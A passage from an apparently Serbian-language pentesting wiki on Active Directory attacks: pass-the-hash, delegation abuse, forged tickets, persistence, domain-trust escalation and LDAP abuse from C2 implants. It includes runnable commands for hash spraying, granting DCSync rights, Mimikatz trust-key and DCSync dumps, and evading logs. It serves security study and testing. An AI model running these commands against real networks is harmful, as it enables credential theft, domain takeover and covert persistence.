Nadamo se da ste uspeli da **kompromitujete neki local admin** nalog koristeći [AsRepRoast](asreproast.md), [Password Spraying](password-spraying.md), [Kerberoast](kerberoast.md), [Responder](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md), uključujući relaying, [EvilSSDP](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md), [lokalno podizanje privilegija](../windows-local-privilege-escalation/index.html).\
Zatim je vreme da dump-ujete sve hash-eve iz memorije i lokalno.\
[**Pročitajte ovu stranicu o različitim načinima za pribavljanje hash-eva.**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Pass the Hash

**Kada imate hash korisnika**, možete ga koristiti za **impersonate** tog korisnika.\
Potrebno je da koristite neki **tool** koji će **obaviti** **NTLM authentication koristeći** taj **hash**, **ili** možete kreirati novu **sessionlogon** i **inject-ovati** taj **hash** u **LSASS**, tako da se taj **hash koristi kada se obavi bilo koji NTLM authentication**. Poslednja opcija je ono što radi mimikatz.\
[**Pročitajte ovu stranicu za više informacija.**](../ntlm/index.html#pass-the-hash)

### Over Pass the Hash/Pass the Key

Ovaj napad ima za cilj da **iskoristi korisnikov NTLM hash za zahtevanje Kerberos ticketa**, kao alternativu uobičajenom Pass The Hash-u preko NTLM protokola. Zbog toga ovo može biti naročito **korisno u mrežama u kojima je NTLM protokol onemogućen** i u kojima je kao authentication protokol dozvoljen samo **Kerberos**.


{{#ref}}
over-pass-the-hash-pass-the-key.md
{{#endref}}

### Pass the Ticket

Kod metode napada **Pass The Ticket (PTT)**, napadači **kradu korisnikov authentication ticket** umesto njegove lozinke ili hash vrednosti. Ovaj ukradeni ticket se zatim koristi za **impersonate** korisnika, čime se dobija neovlašćen pristup resursima i servisima unutar mreže.


{{#ref}}
pass-the-ticket.md
{{#endref}}

### Credentials Reuse

Ako imate **hash** ili **password** nekog **lokalnog administratora**, trebalo bi da pokušate da se **lokalno prijavite** na druge **PC-jeve** koristeći ga.
```bash
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
> [!WARNING]
> Imajte na umu da je ovo prilično **bučno** i da bi **LAPS** to **ublažio**.

### Zloupotreba MSSQL-a i Trusted Links

Ako korisnik ima privilegije za **pristup MSSQL instancama**, mogao bi da ih iskoristi za **izvršavanje komandi** na MSSQL hostu (ako radi kao SA), **krađu** NetNTLM **hash-a** ili čak izvođenje **relay** **attack-a**.\
Ako je MSSQL instanca pouzdana preko database link-a od strane druge instance, korisnik sa privilegijama nad povezanom bazom može moći da **iskoristi odnos poverenja za izvršavanje upita na drugoj instanci**. Ovi odnosi poverenja mogu da se ulančaju i na kraju potencijalno dosegnu pogrešno konfigurisanu bazu na kojoj korisnik može da izvršava komande.\
**Veze između baza funkcionišu čak i preko forest trust-ova.**


{{#ref}}
abusing-ad-mssql.md
{{#endref}}

### Zloupotreba IT platformi za inventarizaciju/implementaciju

Paketi nezavisnih proizvođača za inventarizaciju i implementaciju često otvaraju moćne puteve do credentials-a i izvršavanja koda. Pogledajte:

{{#ref}}
sccm-management-point-relay-sql-policy-secrets.md
{{#endref}}

{{#ref}}
lansweeper-security.md
{{#endref}}

### Unconstrained Delegation

Ako pronađete bilo koji Computer objekat sa atributom [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) i imate domain privilegije na računaru, moći ćete da izdumpujete TGT-ove iz memorije svih korisnika koji se prijave na računar.\
Dakle, ako se **Domain Admin prijavi na računar**, moći ćete da izdumpujete njegov TGT i da se impersonate-ujete koristeći [Pass the Ticket](pass-the-ticket.md).\
Zahvaljujući constrained delegation-u, čak biste mogli da **automatski kompromitujete Print Server** (nadamo se da će to biti DC).


{{#ref}}
unconstrained-delegation.md
{{#endref}}

### Constrained Delegation

Ako je korisniku ili računaru dozvoljen "Constrained Delegation", moći će da se **impersonate-uje kao bilo koji korisnik radi pristupa određenim servisima na računaru**.\
Zatim, ako **kompromitujete hash** ovog korisnika/računara, moći ćete da se **impersonate-ujete kao bilo koji korisnik** (čak i kao domain admini) radi pristupa određenim servisima.


{{#ref}}
constrained-delegation.md
{{#endref}}

### Resourced-based Constrain Delegation

Posedovanje **WRITE** privilegije nad Active Directory objektom udaljenog računara omogućava dobijanje izvršavanja koda sa **povišenim privilegijama**:


{{#ref}}
resource-based-constrained-delegation.md
{{#endref}}

### Zloupotreba permissions/ACL-ova

Kompromitovani korisnik može imati neke **zanimljive privilegije nad određenim domain objektima** koje bi vam mogle omogućiti lateralno **kretanje**/**eskalaciju** privilegija.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Zloupotreba Printer Spooler servisa

Otkrivanje **Spool servisa koji osluškuje** unutar domena može biti **zloupotrebljeno** za **dobijanje novih credentials-a** i **eskalaciju privilegija**.


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### Zloupotreba sesija trećih strana

Ako **drugi korisnici** **pristupaju** **kompromitovanoj** mašini, moguće je **prikupiti credentials-e iz memorije** i čak **inject-ovati beacon-e u njihove procese** radi impersonate-ovanja.\
Korisnici će sistem obično pristupati putem RDP-a, pa ovde možete pronaći kako da izvedete nekoliko attack-a nad RDP sesijama trećih strana:


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### LAPS

**LAPS** obezbeđuje sistem za upravljanje **lozinkom lokalnog Administrator-a** na računarima pridruženim domenu, čime se obezbeđuje da ona bude **randomizovana**, jedinstvena i često **menjana**. Ove lozinke se čuvaju u Active Directory-ju, a pristup je kontrolisan putem ACL-ova samo za autorizovane korisnike. Uz dovoljne permissions za pristup ovim lozinkama, pivoting ka drugim računarima postaje moguć.


{{#ref}}
laps.md
{{#endref}}

### Krađa sertifikata

**Prikupljanje sertifikata** sa kompromitovane mašine može biti način za eskalaciju privilegija unutar okruženja:


{{#ref}}
ad-certificates/certificate-theft.md
{{#endref}}

### Zloupotreba Certificate Templates

Ako su konfigurisani **vulnerable templates**, moguće je zloupotrebiti ih za eskalaciju privilegija:


{{#ref}}
ad-certificates/domain-escalation.md
{{#endref}}

## Post-exploitation sa nalogom visokih privilegija

### Dumping Domain Credentials

Kada dobijete privilegije **Domain Admin-a** ili, još bolje, **Enterprise Admin-a**, možete da **dump-ujete** **domain bazu**: _ntds.dit_.

[**Više informacija o DCSync attack-u možete pronaći ovde**](dcsync.md).

[**Više informacija o krađi NTDS.dit možete pronaći ovde**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Privesc kao Persistence

Neke od prethodno razmatranih tehnika mogu se koristiti za persistence.\
Na primer, možete:

- Učiniti korisnike ranjivim na [**Kerberoast**](kerberoast.md)

```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}r
```

- Učiniti korisnike ranjivim na [**ASREPRoast**](asreproast.md)

```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

- Dodeliti [**DCSync**](#dcsync) privilegije korisniku

```bash
Add-DomainObjectAcl -TargetIdentity "DC=SUB,DC=DOMAIN,DC=LOCAL" -PrincipalIdentity bfarmer -Rights DCSync
```

### Silver Ticket

**Silver Ticket attack** kreira **legitimni Ticket Granting Service (TGS) ticket** za određeni servis koristeći **NTLM hash** (na primer, **hash naloga računara**). Ovaj metod se koristi za **pristup privilegijama servisa**.


{{#ref}}
silver-ticket.md
{{#endref}}

### Golden Ticket

**Golden Ticket attack** podrazumeva da attacker dobije pristup **NTLM hash-u krbtgt naloga** u Active Directory (AD) okruženju. Ovaj nalog je poseban jer se koristi za potpisivanje svih **Ticket Granting Ticket-ova (TGT-ova)**, koji su neophodni za autentikaciju unutar AD mreže.

Kada attacker dobije ovaj hash, može da kreira **TGT-ove** za bilo koji nalog po svom izboru (Silver ticket attack).


{{#ref}}
golden-ticket.md
{{#endref}}

### Diamond Ticket

Oni su slični golden ticket-ima, ali su falsifikovani na način koji **zaobilazi uobičajene mehanizme za detekciju golden ticket-a.**


{{#ref}}
diamond-ticket.md
{{#endref}}

### **Persistence naloga pomoću sertifikata**

**Posedovanje sertifikata naloga ili mogućnost njihovog zahtevanja** veoma je dobar način da se zadrži persistence na korisničkom nalogu (čak i ako korisnik promeni lozinku):


{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

### **Persistence domena pomoću sertifikata**

**Korišćenjem sertifikata takođe je moguće zadržati persistence sa visokim privilegijama unutar domena:**


{{#ref}}
ad-certificates/domain-persistence.md
{{#endref}}

### AdminSDHolder Group

Objekat **AdminSDHolder** u Active Directory-ju obezbeđuje sigurnost **privilegovanih grupa** (kao što su Domain Admins i Enterprise Admins) primenom standardne **Access Control List (ACL)** na ove grupe, kako bi se sprečile neovlašćene izmene. Međutim, ova funkcija može biti zloupotrebljena; ako attacker izmeni ACL objekta AdminSDHolder tako da običnom korisniku dodeli potpuni pristup, taj korisnik dobija široku kontrolu nad svim privilegovanim grupama. Ova sigurnosna mera, namenjena zaštiti, tako može imati suprotan efekat i omogućiti neovlašćeni pristup ako se pažljivo ne nadzire.

[**Više informacija o AdminDSHolder Group možete pronaći ovde.**](privileged-groups-and-token-privileges.md#adminsdholder-group)

### DSRM Credentials

Unutar svakog **Domain Controller-a (DC-a)** postoji nalog **lokalnog administratora**. Dobijanjem admin prava na takvoj mašini, hash lokalnog Administrator-a može se izvući pomoću **mimikatz-a**. Nakon toga je potrebna izmena registra kako bi se **omogućilo korišćenje ove lozinke**, čime se omogućava remote pristup nalogu lokalnog Administrator-a.


{{#ref}}
dsrm-credentials.md
{{#endref}}

### ACL Persistence

Možete **dodeliti** neke **posebne permissions** **korisniku** nad određenim domain objektima, što će tom korisniku omogućiti da **u budućnosti eskalira privilegije**.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Security Descriptors

**Security descriptors** se koriste za **čuvanje** **permissions** koje **objekat ima** nad **objektom**. Ako možete da napravite samo **malu izmenu** u **security descriptor-u** objekta, možete dobiti veoma zanimljive privilegije nad tim objektom, bez potrebe da budete član privilegovane grupe.


{{#ref}}
security-descriptors.md
{{#endref}}

### Dynamic Objects Anti-Forensics / Evasion

Zloupotrebite pomoćnu klasu `dynamicObject` za kreiranje kratkotrajnih principal-a/GPO-ova/DNS zapisa sa `entryTTL`/`msDS-Entry-Time-To-Die`; oni se sami brišu bez tombstone-a, uklanjajući LDAP dokaze, dok za sobom ostavljaju orphan SID-ove, neispravne `gPLink` reference ili keširane DNS odgovore (npr. zagađenje AdminSDHolder ACE-a ili zlonamerne `gPCFileSysPath`/AD-integrisane DNS redirekcije).

{{#ref}}
ad-dynamic-objects-anti-forensics.md
{{#endref}}

### Skeleton Key

Izmenite **LSASS** u memoriji kako biste uspostavili **univerzalnu lozinku**, čime se omogućava pristup svim domain nalozima.


{{#ref}}
skeleton-key.md
{{#endref}}

### Custom SSP

[Ovde saznajte šta je SSP (Security Support Provider).](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
Možete kreirati **sopstveni SSP** za **hvatanje** **credentials-a** korišćenih za pristup mašini u **clear text-u**.


{{#ref}}
custom-ssp.md
{{#endref}}

### DCShadow

On registruje **novi Domain Controller** u AD-u i koristi ga za **push-ovanje atributa** (SIDHistory, SPN-ova...) na navedene objekte, a da pritom ne ostavlja nikakve **logove** o **izmenama**. Potrebne su vam DA privilegije i morate biti unutar **root domena**.\
Imajte na umu da će se, ako koristite pogrešne podatke, pojaviti veoma ružni logovi.


{{#ref}}
dcshadow.md
{{#endref}}

### LAPS Persistence

Prethodno smo razmatrali kako da eskalirate privilegije ako imate **dovoljno permissions za čitanje LAPS lozinki**. Međutim, ove lozinke mogu se koristiti i za **održavanje persistence-a**.\
Pogledajte:


{{#ref}}
laps.md
{{#endref}}

## Forest Privilege Escalation - Domain Trusts

Microsoft posmatra **Forest** kao sigurnosnu granicu. To podrazumeva da **kompromitovanje jednog domena potencijalno može dovesti do kompromitovanja čitavog Forest-a**.<sup>[[1]](#references)</sup>

### Osnovne informacije

[**Domain trust**](<http://technet.microsoft.com/en-us/library/cc759554(v=ws.10).aspx>) je sigurnosni mehanizam koji korisniku iz jednog **domena** omogućava pristup resursima u drugom **domenu**. On u suštini kreira vezu između sistema za autentikaciju dva domena, omogućavajući neometan protok provera autentikacije. Kada domeni uspostave trust, razmenjuju i čuvaju određene **ključeve** unutar svojih **Domain Controller-a (DC-ova)**, koji su ključni za integritet trust-a.

U tipičnom scenariju, ako korisnik želi da pristupi servisu u **trusted domain-u**, najpre mora da zatraži poseban ticket poznat kao **inter-realm TGT** od DC-a svog domena. Ovaj TGT je šifrovan deljenim **ključem** sa kojim su se oba domena saglasila. Korisnik zatim prosleđuje ovaj TGT **DC-u trusted domain-a** da bi dobio service ticket (**TGS**). Nakon uspešne validacije inter-realm TGT-a od strane DC-a trusted domain-a, on izdaje TGS, čime korisniku daje pristup servisu.

**Koraci**:

1. **Client computer** u **Domain 1** započinje proces korišćenjem svog **NTLM hash-a** za zahtev za **Ticket Granting Ticket (TGT)** od svog **Domain Controller-a (DC1)**.
2. DC1 izdaje novi TGT ako je client uspešno autentikovan.
3. Client zatim zahteva **inter-realm TGT** od DC1, koji je potreban za pristup resursima u **Domain 2**.
4. Inter-realm TGT se šifruje pomoću **trust key-a** koji dele DC1 i DC2 kao deo dvosmernog domain trust-a.
5. Client prosleđuje inter-realm TGT **Domain Controller-u (DC2) domena Domain 2**.
6. DC2 proverava inter-realm TGT koristeći deljeni trust key i, ako je validan, izdaje **Ticket Granting Service (TGS)** za server u Domain 2 kojem client želi da pristupi.
7. Na kraju, client prosleđuje ovaj TGS serveru, koji je šifrovan hash-om naloga servera, kako bi dobio pristup servisu u Domain 2.

### Različiti trust-ovi

Važno je primetiti da **trust može biti jednosmeran ili dvosmeran**. U dvosmernoj opciji, oba domena veruju jedan drugom, dok će u **jednosmernom** trust odnosu jedan domen biti **trusted**, a drugi **trusting** domen. U drugom slučaju, **moći ćete da pristupate resursima unutar trusting domena samo iz trusted domena**.

Ako Domain A veruje Domain B-u, A je trusting domen, a B je trusted domen. Pored toga, u **Domain A**, ovo bi bio **Outbound trust**; a u **Domain B**, ovo bi bio **Inbound trust**.

**Različiti trusting odnosi**

- **Parent-Child Trusts**: Ovo je uobičajeno podešavanje unutar istog forest-a, gde child domen automatski ima dvosmerni transitive trust sa parent domenom. To u suštini znači da zahtevi za autentikaciju mogu neometano da prolaze između parent i child domena.
- **Cross-link Trusts**: Poznati kao "shortcut trust-ovi", uspostavljaju se između child domena radi ubrzavanja referral procesa. U složenim forest-ima, authentication referral-i obično moraju da putuju do forest root-a, a zatim nazad do ciljnog domena. Kreiranjem cross-link-ova put se skraćuje, što je posebno korisno u geografski distribuiranim okruženjima.
- **External Trusts**: Uspostavljaju se između različitih, nepovezanih domena i po prirodi su non-transitive. Prema [Microsoft-ovoj dokumentaciji](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>), external trust-ovi su korisni za pristup resursima u domenu izvan trenutnog forest-a koji nije povezan forest trust-om. Bezbednost se unapređuje SID filtering-om sa external trust-ovima.
- **Tree-root Trusts**: Ovi trust-ovi se automatski uspostavljaju između forest root domena i novog tree root-a. Iako nisu često prisutni, tree-root trust-ovi su važni za dodavanje novih domain tree-ova u forest, omogućavajući im da zadrže jedinstveno ime domena i obezbeđujući dvosmernu tranzitivnost. Više informacija možete pronaći u [Microsoft-ovom vodiču](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>).
- **Forest Trusts**: Ovaj tip trust-a predstavlja dvosmerni transitive trust između dva forest root domena i takođe primenjuje SID filtering radi unapređenja sigurnosnih mera.
- **MIT Trusts**: Ovi trust-ovi se uspostavljaju sa non-Windows, [RFC4120-compliant](https://tools.ietf.org/html/rfc4120) Kerberos domenima. MIT trust-ovi su nešto specijalizovaniji i namenjeni okruženjima koja zahtevaju integraciju sa Kerberos sistemima izvan Windows ekosistema.

#### Druge razlike u **trusting odnosima**

- Trust odnos takođe može biti **transitive** (A veruje B-u, B veruje C-u, pa A veruje C-u) ili **non-transitive**.
- Trust odnos može biti podešen kao **bidirectional trust** (oba veruju jedan drugom) ili kao **one-way trust** (samo jedan veruje drugom).

### Attack Path

1. **Enumerišite** trusting odnose
2. Proverite da li neki **security principal** (user/group/computer) ima **pristup** resursima **drugog domena**, možda preko ACE unosa ili članstvom u grupama drugog domena. Potražite **odnose između domena** (trust je verovatno zbog toga kreiran).
1. kerberoast u ovom slučaju može biti još jedna opcija.
3. **Kompromitujte** **naloge** koji mogu da se **pivot-uju** kroz domene.

Attackers sa mogućnošću pristupa resursima u drugom domenu mogu to ostvariti putem tri osnovna mehanizma:

- **Local Group Membership**: Principali mogu biti dodati u lokalne grupe na mašinama, kao što je grupa “Administrators” na serveru, čime dobijaju značajnu kontrolu nad tom mašinom.
- **Foreign Domain Group Membership**: Principali takođe mogu biti članovi grupa unutar stranog domena. Međutim, efikasnost ovog metoda zavisi od prirode trust-a i opsega grupe.
- **Access Control Lists (ACLs)**: Principali mogu biti navedeni u **ACL-u**, naročito kao entiteti u **ACE-ovima** unutar **DACL-a**, čime im se obezbeđuje pristup određenim resursima. Za one koji žele da detaljnije prouče mehanizme ACL-ova, DACL-ova i ACE-ova, whitepaper pod nazivom “[An ACE Up The Sleeve](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)” predstavlja dragocen resurs.<sup>[[17]](#references)</sup>

### Pronalaženje eksternih korisnika/grupa sa permissions

Možete proveriti **`CN=<user_SID>,CN=ForeignSecurityPrincipals,DC=domain,DC=com`** da biste pronašli foreign security principals u domenu. To će biti user/group iz **eksternog domena/forest-a**.

Ovo možete proveriti u **Bloodhound-u** ili pomoću powerview-a:
```powershell
# Get users that are i groups outside of the current domain
Get-DomainForeignUser

# Get groups inside a domain with users our
Get-DomainForeignGroupMember
```
### Child-to-Parent forest privilege escalation
```bash
# From PowerView
Get-DomainTrust

SourceName      : sub.domain.local    --> current domain
TargetName      : domain.local        --> foreign domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST       --> WITHIN_FOREST: Both in the same forest
TrustDirection  : Bidirectional       --> Trust direction (2ways in this case)
WhenCreated     : 2/19/2021 1:28:00 PM
WhenChanged     : 2/19/2021 1:28:00 PM
```
Drugi načini za enumeraciju poverenja domena:
```bash
# Get DCs
nltest /dsgetdc:<DOMAIN>

# Get all domain trusts
nltest /domain_trusts /all_trusts /v

# Get all trust of a domain
nltest /dclist:sub.domain.local
nltest /server:dc.sub.domain.local /domain_trusts /all_trusts
```
> [!WARNING]
> Postoje **2 pouzdana ključa**, jedan za _Child --> Parent_, a drugi za _Parent_ --> _Child_.\
> Onaj koji koristi trenutni domen možete pronaći pomoću:
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
> ```

#### SID-History Injection

Eskalirajte na Enterprise admin nivo u child/parent domenu zloupotrebom trust-a i SID-History injection-a:


{{#ref}}
sid-history-injection.md
{{#endref}}

#### Exploit writeable Configuration NC

Razumevanje načina na koji se Configuration Naming Context (NC) može iskoristiti od ključne je važnosti. Configuration NC služi kao centralno spremište konfiguracionih podataka kroz čitavu forest u Active Directory (AD) okruženjima. Ovi podaci se repliciraju na svaki Domain Controller (DC) unutar forest-a, pri čemu writable DC-ovi održavaju writable kopiju Configuration NC-a. Za iskorišćavanje ovoga neophodno je imati **SYSTEM privilegije na DC-u**, po mogućnosti child DC-u.

**Povezivanje GPO-a sa root DC site-om**

Sites container u Configuration NC-u sadrži informacije o site-ovima svih računara pridruženih domenu unutar AD forest-a. Radom sa SYSTEM privilegijama na bilo kom DC-u, napadači mogu da povežu GPO-ove sa root DC site-ovima. Ova radnja potencijalno kompromituje root domen manipulisanjem politikama koje se primenjuju na te site-ove.

Za detaljne informacije možete pogledati istraživanje o [Bypassing SID Filtering](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4).<sup>[[12]](#references)</sup>

**Kompromitovanje bilo kog gMSA-a u forest-u**

Jedan od attack vektora podrazumeva ciljanje privilegovanih gMSA-ova unutar domena. KDS Root key, neophodan za izračunavanje lozinki gMSA-ova, čuva se u Configuration NC-u. Sa SYSTEM privilegijama na bilo kom DC-u moguće je pristupiti KDS Root key-u i izračunati lozinke za bilo koji gMSA u čitavom forest-u.

Detaljna analiza i uputstva korak po korak dostupni su u:


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

Dopunski delegirani MSA attack (BadSuccessor – zloupotreba migration attributes):


{{#ref}}
badsuccessor-dmsa-migration-abuse.md
{{#endref}}

Dodatno eksterno istraživanje: [Golden gMSA Trust Attacks](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-5).<sup>[[13]](#references)</sup>

**Napad promenom Schema-e**

Ovaj metod zahteva strpljenje, odnosno čekanje na kreiranje novih privilegovanih AD objekata. Sa SYSTEM privilegijama napadač može da izmeni AD Schema kako bi bilo kom korisniku dodelio potpunu kontrolu nad svim klasama. To može dovesti do neovlašćenog pristupa i kontrole nad novokreiranim AD objektima.

Dodatno štivo dostupno je u tekstu [Schema Change Trust Attacks](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-6).<sup>[[14]](#references)</sup>

**Od DA do EA uz ADCS ESC5**

ADCS ESC5 ranjivost cilja kontrolu nad Public Key Infrastructure (PKI) objektima radi kreiranja certificate template-a koji omogućava autentifikaciju kao bilo koji korisnik unutar forest-a. Pošto se PKI objekti nalaze u Configuration NC-u, kompromitovanje writable child DC-a omogućava izvršavanje ESC5 attack-a.

Više detalja dostupno je u tekstu [From DA to EA with ESC5](https://specterops.io/blog/2023/05/16/from-da-to-ea-with-esc5/).<sup>[[15]](#references)</sup> U scenarijima bez ADCS-a, napadač može da podesi neophodne komponente, kao što je objašnjeno u tekstu [Escalating from Child Domain Admins to Enterprise Admins](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/).<sup>[[16]](#references)</sup>

### Spoljni domen forest-a - One-Way (Inbound) ili bidirekcioni
```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM
```
U ovom scenariju **vašem domenu veruje** eksterni domen, što vam daje **neodređene dozvole** nad njim. Moraćete da utvrdite **koji principali iz vašeg domena imaju koji nivo pristupa eksternom domenu**, a zatim pokušate da to iskoristite:


{{#ref}}
external-forest-domain-oneway-inbound.md
{{#endref}}

### Eksterni domen šume - jednosmerni (odlazni)
```bash
Get-DomainTrust -Domain current.local

SourceName      : current.local   --> Current domain
TargetName      : external.local  --> Destination domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound        --> Outbound trust
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM
```
U ovom scenariju **vaš domen** **dodeljuje** neke **privilegije** principalu iz **drugog domena**.

Međutim, kada je **domen pouzdan** za domen koji mu veruje, pouzdani domen **kreira korisnika** sa **predvidljivim imenom** koji kao **lozinku koristi lozinku pouzdanog domena**. To znači da je moguće **pristupiti korisniku iz domena koji veruje da bi se ušlo u pouzdani domen**, izvršiti njegovo enumerisanje i pokušati dodatno eskalirati privilegije:


{{#ref}}
external-forest-domain-one-way-outbound.md
{{#endref}}

Drugi način za kompromitovanje pouzdanog domena jeste pronalaženje [**SQL trusted link**](abusing-ad-mssql.md#mssql-trusted-links) kreiranog u **suprotnom smeru** od odnosa poverenja između domena (što nije naročito često).

Drugi način za kompromitovanje pouzdanog domena jeste čekanje na računaru na koji **korisnik iz pouzdanog domena može da pristupi** kako bi se prijavio putem **RDP-a**. Napadač bi zatim mogao da ubaci kod u proces RDP sesije i odatle **pristupi izvornom domenu žrtve**.\
Pored toga, ako je **žrtva montirala svoj hard disk**, napadač bi iz procesa **RDP sesije** mogao da sačuva **backdoors** u **startup folderu hard diska**. Ova tehnika se naziva **RDPInception.**


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### Ublažavanje zloupotrebe poverenja između domena

### **SID Filtering:**

- Rizik od napada koji koriste atribut SID history kroz poverenja između forest-a ublažava se pomoću SID Filteringa, koji je podrazumevano aktiviran na svim poverenjima između forest-a. Ovo se zasniva na pretpostavci da su poverenja unutar forest-a bezbedna, pri čemu se forest, a ne domen, smatra bezbednosnom granicom, u skladu sa Microsoftovim stavom.
- Međutim, postoji problem: SID filtering može da poremeti aplikacije i korisnički pristup, što dovodi do njegovog povremenog deaktiviranja.

### **Selective Authentication:**

- Kod poverenja između forest-a, korišćenje Selective Authentication obezbeđuje da korisnici iz dva forest-a ne budu automatski autentifikovani. Umesto toga, potrebne su eksplicitne dozvole da bi korisnici pristupili domenima i serverima unutar domena ili forest-a koji im veruje.
- Važno je napomenuti da ove mere ne štite od iskorišćavanja writable Configuration Naming Context (NC) niti od napada na trust account.

[**More information about domain trusts in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)<sup>[[3]](#references)</sup>

## Zloupotreba AD-a zasnovana na LDAP-u iz implantata na hostu

[LDAP BOF Collection](https://github.com/P0142/LDAP-Bof-Collection) ponovo implementira bloodyAD-style LDAP primitive kao x64 Beacon Object Files koji se u potpunosti izvršavaju unutar implantata na hostu (npr. Adaptix C2). Operateri kompajliraju paket pomoću `git clone https://github.com/P0142/ldap-bof-collection.git && cd ldap-bof-collection && make`, učitavaju `ldap.axs`, a zatim iz beacon-a pozivaju `ldap <subcommand>`. Sav saobraćaj koristi trenutni kontekst bezbednosti prijavljenog korisnika preko LDAP-a (389), uz signing/sealing, ili LDAPS-a (636), uz automatsko poverenje u sertifikat, tako da nisu potrebni socks proxy-ji niti artefakti na disku.<sup>[[4]](#references)</sup>

### LDAP enumerisanje sa strane implantata

- `get-users`, `get-computers`, `get-groups`, `get-usergroups` i `get-groupmembers` razrešavaju kratka imena/OU putanje u pune DN-ove i ispisuju odgovarajuće objekte.
- `get-object`, `get-attribute` i `get-domaininfo` preuzimaju proizvoljne atribute (uključujući security descriptors), kao i metapodatke forest-a/domena iz `rootDSE`.
- `get-uac`, `get-spn`, `get-delegation` i `get-rbcd` direktno iz LDAP-a prikazuju kandidate za roasting, postavke delegiranja i postojeće deskriptore [Resource-based Constrained Delegation](resource-based-constrained-delegation.md).
- `get-acl` i `get-writable --detailed` analiziraju DACL da bi naveli trustees, prava (GenericAll/WriteDACL/WriteOwner/upis atributa) i nasleđivanje, čime se odmah dobijaju mete za privilege escalation putem ACL-a.
```powershell
ldap get-users --ldaps
ldap get-computers -ou "OU=Servers,DC=corp,DC=local"
ldap get-writable --detailed
ldap get-acl "CN=Tier0,OU=Admins,DC=corp,DC=local"
```
### LDAP write primitives for escalation & persistence

- Object creation BOFs (`add-user`, `add-computer`, `add-group`, `add-ou`) omogućavaju operatoru da pripremi nove principals ili mašinske naloge tamo gde postoje OU prava. `add-groupmember`, `set-password`, `add-attribute` i `set-attribute` direktno preuzimaju kontrolu nad ciljevima kada se pronađu prava za upis svojstava.
- Komande usmerene na ACL, kao što su `add-ace`, `set-owner`, `add-genericall`, `add-genericwrite` i `add-dcsync`, pretvaraju WriteDACL/WriteOwner nad bilo kojim AD objektom u resetovanje lozinki, kontrolu članstva u grupama ili DCSync privilegije za replikaciju, bez ostavljanja PowerShell/ADSI tragova. Odgovarajuće `remove-*` komande uklanjaju ubačene ACE-ove.

### Delegation, roasting, and Kerberos abuse

- `add-spn`/`set-spn` trenutno čine kompromitovanog korisnika podobnim za Kerberoast; `add-asreproastable` (UAC toggle) označava ga za AS-REP roasting bez promene lozinke.
- Delegation makroi (`add-delegation`, `set-delegation`, `add-constrained`, `add-unconstrained`, `add-rbcd`) menjaju `msDS-AllowedToDelegateTo`, UAC flags ili `msDS-AllowedToActOnBehalfOfOtherIdentity` direktno iz beacon-a, omogućavajući constrained/unconstrained/RBCD attack paths i uklanjajući potrebu za udaljenim PowerShell-om ili RSAT-om.

### sidHistory injection, OU relocation, and attack surface shaping

- `add-sidhistory` ubacuje privilegovane SID-ove u SID history kontrolisanog principala (pogledajte [SID-History Injection](sid-history-injection.md)), obezbeđujući prikriveno nasleđivanje pristupa u potpunosti preko LDAP/LDAPS-a.
- `move-object` menja DN/OU računara ili korisnika, omogućavajući napadaču da premesti sredstva u OU-ove u kojima već postoje delegirana prava, pre zloupotrebe komandi `set-password`, `add-groupmember` ili `add-spn`.
- Strogo ograničene komande za uklanjanje (`remove-attribute`, `remove-delegation`, `remove-rbcd`, `remove-uac`, `remove-groupmember` itd.) omogućavaju brzo vraćanje promena nakon što operator prikupi credentials ili persistence, čime se smanjuje telemetry.

## AD -> Azure & Azure -> AD


{{#ref}}
https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/azure-ad-connect-hybrid-identity/index.html
{{#endref}}

## Some General Defenses

[**Saznajte više o zaštiti credentials ovde.**](../stealing-credentials/credentials-protections.md)

### **Defensive Measures for Credential Protection**

